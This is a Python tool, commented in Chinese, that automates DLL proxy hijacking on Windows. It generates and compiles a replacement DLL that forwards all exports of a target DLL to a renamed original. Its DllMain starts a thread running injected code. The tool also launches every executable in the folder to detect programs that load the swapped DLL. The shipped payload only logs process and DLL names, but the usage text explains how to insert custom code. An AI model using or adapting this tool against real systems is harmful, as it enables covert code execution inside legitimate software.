import asyncio
import os
import shutil
import subprocess
import argparse
from pathlib import Path
import pefile
import platform
def getDllName(exports , dllname):
    dll_function_name = []
    i=1
    for export in exports:
        if "Name" in export:
            funcname = str(export["Name"])[2:-1]
            tmp = '#pragma comment(linker, "/export:{}=old_{}.{},@{}")\n'.format(funcname , dllname , funcname , i)
            dll_function_name.append(tmp)
        i = i+1
    return dll_function_name
def writeC(dllFuncName,dllpath,dllname):
    otherFunctions = r"""
    void GetCurrentProcessName(char* buffer, size_t buflen) {
    DWORD pid = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess != NULL) {
        char path[MAX_PATH];
        DWORD size = MAX_PATH;
        if (QueryFullProcessImageNameA(hProcess, 0, path, &size)) {
            // 只保留文件名部分
            char* fileName = strrchr(path, '\\');
            if (fileName != NULL) {
                strncpy(buffer, fileName + 1, buflen - 1); // 跳过'\'
                buffer[buflen - 1] = '\0';
            }
        }
        CloseHandle(hProcess);
    }
}

// 获取当前DLL的名字
void GetCurrentDllPath(char* buffer, size_t buflen) {
    HMODULE hModule = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                      (LPCTSTR)GetCurrentDllPath, &hModule);
    GetModuleFileNameA(hModule, buffer, buflen);
}

void WriteInfoToFile() {
    char currentProcessName[MAX_PATH] = "";
    char currentDllPath[MAX_PATH] = "";
    char tempPath[MAX_PATH];

    GetCurrentProcessName(currentProcessName, sizeof(currentProcessName));
    GetCurrentDllPath(currentDllPath, sizeof(currentDllPath));

    // 获取临时文件夹路径
    if (GetTempPathA(sizeof(tempPath), tempPath) != 0) {

        FILE *file = fopen("result.txt", "a+");
        if (file != NULL) {
            fprintf(file, "Current Process Name: %s\n", currentProcessName);
            fprintf(file, "Current DLL Path: %s\n", currentDllPath);
            fclose(file);
        }
    }
}
    """
    DllProxyContent = """
    WriteInfoToFile();
    //MessageBox(0, "2", "3", 0);
    """
    headerFile = """
//#include "pch.h"
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tlhelp32.h>
#include <string.h>
#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)
"""
    tailFile = """
DWORD WINAPI DllProxy(LPVOID lpParameter)
{
    """ + DllProxyContent + """
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    HANDLE threadHandle;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, DllProxy, NULL, 0, NULL);
        CloseHandle(threadHandle);
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
"""
    cpath = dllpath + "/" + "new_" + dllname.replace('.dll','.c')
    with open(cpath,"w",encoding="GBK") as file:
        file.write(headerFile)
        for funcname in dllFuncName:
            file.write(funcname)
        file.write(otherFunctions)
        file.write(tailFile)
        file.close()
    return cpath
def renameDll(dllpath , dllname, mode):
    if mode == 1:
        os.rename(dllname,dllpath + "/" + "old_" + dllname)
    else: 
        os.rename(dllpath + "/" + "old_" + dllname,dllname)
def setCompileEnviron(year , version ,mymachine):
    vcvarsall_path = f'C:\\Program Files\\Microsoft Visual Studio\\{year}\\{version}\\VC\\Auxiliary\\Build\\vcvarsall.bat'
    mymachine = "x86" if mymachine == "x86" else "amd64"
    proc = subprocess.Popen(f'"{vcvarsall_path}" {mymachine} & set', shell=True, stdout=subprocess.PIPE)
    for line in proc.stdout:
        try:
            decoded_line = line.decode('utf-8', errors='replace').strip()
        except UnicodeDecodeError:
            try:
                decoded_line = line.decode('gbk', errors='replace').strip()
            except UnicodeDecodeError:
                exit("环境变量解析error,可能是因为系统变量PATH中出现中文")
                continue
        if '=' in decoded_line:
            key, _, value = decoded_line.partition('=')
            os.environ[key] = value
def getCompilePath(mymachine):
    year = os.listdir("C:\\Program Files\\Microsoft Visual Studio")[0]
    edition = os.listdir(f"C:\\Program Files\\Microsoft Visual Studio\\{year}\\")[0]
    setCompileEnviron(year,edition,mymachine)
    numpath = f"C:\\Program Files\\Microsoft Visual Studio\\{year}\\{edition}\\VC\\Tools\\MSVC\\"
    numVersion = os.listdir(numpath)[0]
    host = getHost()
    compilePath = f"C:\\Program Files\\Microsoft Visual Studio\\{year}\\{edition}\\VC\\Tools\\MSVC\\{numVersion}\\bin\\Host{host}\\{mymachine}"
    return compilePath
def compileToDll(cpath , dllname):
    mymachine = "x86" if pe.FILE_HEADER.Machine == 332 else "x64"
    compilePath = getCompilePath(mymachine)
    clpath = f"{compilePath}\\cl.exe"
    folder = "tmp"
    if os.path.exists(folder):
        shutil.rmtree(folder)
    os.makedirs(folder, exist_ok=True)
    shutil.move(cpath,folder)
    compileCmd = [clpath, '/LD', cpath ,  f'/Fe:{dllname}' , '/link' , 'user32.lib' , f"/MACHINE:{mymachine}" ]
    try:
        subprocess.run(compileCmd, cwd=os.getcwd() + "/" +folder, check=True, shell=True)
        shutil.copy(f"./{folder}/{dllname}",dllname)
    except subprocess.CalledProcessError as e:
        exit(f"编译失败，错误信息：{e}")
def getHost():
    host = platform.architecture()[0][0:2]
    host = "x64" if host == "64" else "x86"
    return host
async def run_exe_background(exe_path):
    try:
        process = await asyncio.create_subprocess_exec(
            exe_path,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.PIPE
        )
        print(f"{exe_path} 已启动 (PID: {process.pid})")
    except Exception as e:
        return f"启动 {exe_path} 时遇到错误: {str(e)}"
async def execute_exes_async_background(exe_files):
    tasks = [run_exe_background(exe) for exe in exe_files]
    results = await asyncio.gather(*tasks)
    errors = [result for result in results if result is not None]
    return errors
def list_exe_files():
    return [str(f) for f in Path('.').glob('*.exe')]
def read_result_txt():
    result_file_path="result.txt"
    if os.path.exists(result_file_path):
        with open(result_file_path, 'r') as file:
            return file.read()
    else:
        print(f"{result_file_path} 文件不存在")
        return None
async def excuteFile():
    exe_files = list_exe_files()
    print(f"找到的exe文件: {exe_files}")
    errors = await execute_exes_async_background(exe_files)
    if errors:
        print("\n以下为启动过程中发生的错误:")
        for error in errors:
            print(error)
    else:
        print("所有程序均已成功启动。")
    content = read_result_txt()
    if content:
        print("\n从result.txt读取的内容:")
        print(content)
def dig_main():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(excuteFile())
def init():
    parser = argparse.ArgumentParser(epilog="""
Auto compile mode: python dll_proxy.py -D target.dll -C auto --detect auto\n
Manual mode: python dll_proxy.py -D target.dll -C manually --detect manually\n
    """,
    formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--dll" , "-D" , type=str , help="origin dllpath" , required=True)
    parser.add_argument("--compile", "-C", default = "manually", choices = ["manually" , "auto" ,"None"] , type=str, help="auto compile .c to .dll")
    parser.add_argument("--detect", default="manually", choices=["manually", "auto"], type=str,help="auto detect vulnerable exe")
    args = parser.parse_args()
    dllpath, dllname = os.path.split(args.dll)
    return dllpath , dllname , args.compile ,args.detect
if __name__ == "__main__":
    dllpath , dllname , compile , detect  = init()
    if dllpath == "":
        dllpath = "."
    pe = pefile.PE(dllpath + "/" + dllname)
    dllFuncName = getDllName(pe.dump_dict()["Exported symbols"][1:] ,dllname)
    pe.close()
    cpath = writeC(dllFuncName , dllpath , dllname)
    print("success write template file,you can compile it")
    if compile == "auto":
        renameDll(dllpath, dllname , 1)
        try:
            compileToDll(cpath , dllname)
            print(f"success auto compile, new dll path is {dllpath}/{dllname}")
            print(f"origin dll path is {dllpath}/old_{dllname}")
            if detect == "auto":
                dig_main()
        except:
            print("已自动生成对应的 .c文件,自动编译失败,请自行打开visual studio进行手动编译")
            renameDll(dllpath, dllname, 2)
    elif compile == "None":
        if detect == "auto":
            dig_main()
        else:
            print("请手动执行当前路径下所有exe并从result.txt中获取结果")
    else:
        help = """
            How to use manual mode ?
            1.use visual studio to compile new.c and to new.dll
            2.rename old_dllname to old.dll, for example old_dllname is aaa.dll, you can rename aaa.dll to old_aaa.dll
            3.copy new.dll to old dll folder
            4.rename new.dll to old_dllname, for example old_dllname is aaa.dll, you can rename new.dll to aaa.dll
            5.excute the exe file, if success you can see a MessageBox
            6.now you can change new.c#DllProxy() and compile it second to excute your custom code
            """
        print(help)
